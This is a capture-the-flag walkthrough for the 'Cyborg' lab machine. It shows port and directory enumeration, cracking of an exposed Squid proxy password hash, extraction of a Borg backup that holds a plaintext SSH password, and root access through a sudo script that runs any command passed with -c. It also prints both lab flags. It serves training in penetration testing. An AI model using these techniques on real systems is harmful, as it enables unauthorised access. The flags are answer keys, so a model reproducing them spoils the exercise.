# Cyborg

## Nmap

```bash
nmap -sV -p- -T4 <IP> -vv
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
```

---

## Web Enumeration

Doing a dirsearch, we see an admin page since the main page is just an Apache default page:

```
04:08:34  403   275B  /.htaccess_orig
04:08:40  301   308B  /admin   →  http://cyborg.thm/admin/
04:08:40  200     2KB  /admin/
04:08:40  200     2KB  /admin/admin.html
04:08:41  200     2KB  /admin/index.html
04:08:55  301   306B  /etc   →  http://cyborg.thm/etc/
04:08:55  200   442B  /etc/
04:09:18  403   275B  /server-st
```

Looking around the admin page, we see this chat log:

```
############################################
[Yesterday at 4.32pm from Josh]
Are we all going to watch the football game at the weekend??
############################################
############################################
[Yesterday at 4.33pm from Adam]
Yeah Yeah mate absolutely hope they win!
############################################
############################################
[Yesterday at 4.35pm from Josh]
See you there then mate!
############################################
############################################
[Today at 5.45am from Alex]
Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
I decided to give up like i always do ahahaha sorry about that.
I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
Might pass it over to the IT guys but in the meantime all the config files are laying about.
And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
Other than that im pretty sure my backup "music_archive" is safe just to confirm.
############################################
############################################
```

---

## Squid Proxy Config

Going to check the squid proxy config in `/etc/`, we see:

```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users

music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

That looks like a hash, so let’s crack it:

```bash
# 1) Save the hash
echo '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > hash.txt

# 2) Crack as md5crypt (APR1)
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Result:

```
music_archive:squidward
```

---

## Archive Access

Going back to the admin page, I saw we could download a file in the archive tab.

<img width="558" height="184" alt="Screenshot From 2025-09-02 23-17-43" src="https://github.com/user-attachments/assets/fa67bb6c-e5be-43a8-b86e-8b2964c00964" />

Opening it up, there were a couple of files. Looking around, I found a `Readme` with the site:

```
https://borgbackup.readthedocs.io/
```

I also saw a config file named `final_archive`:

```
[repository]
version = 1
segments_per_dir = 1000
max_segment_size = 524288000
append_only = 0
storage_quota = 0
additional_free_space = 0
id = ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31
key = hqlhbGdvcml0aG2mc2hhMjU2pGRhdGHaAZ6ZS3pOjzX7NiYkZMTEyECo+6f9mTsiO9ZWFV
```

From the BorgBackup docs, we can extract with:

```bash
borg extract /path/to/repo::archive_name
```

I listed the archive:

```bash
borg list home/field/dev/final_archive
```

Result:

```
music_archive  Tue, 2020-12-29 14:00:38  [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```

Then extracted:

```bash
borg extract home/field/dev/final_archive::music_archive
```

Inside `/root/home/alex/Documents`, I found `note.txt`:

```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

---

## SSH

Logging in with `alex:S3cretP@s3`, I found the first flag:

> Q1: User flag
> A1: flag{1\_hop3\_y0u\_ke3p\_th3\_arch1v3s\_saf3}

---

## Privilege Escalation

Running `sudo -l` as alex:

```
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

Looking at `/etc/mp3backups/backup.sh`:

```bash
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt

while getopts c: flag
do
    case "${flag}" in 
        c) command=${OPTARG};;
    esac
done

cmd=$($command)
echo $cmd
```

The script runs whatever is passed in via `-c` as root. I used it to grab the root flag directly:

```bash
sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
```

---

## Flags

> Q1: User flag
> A1: flag{1\_hop3\_y0u\_ke3p\_th3\_arch1v3s\_saf3}

> Q2: Root flag
> A2: flag{Than5s\_f0r\_play1ng\_H0p£\_y0u\_enJ053d}
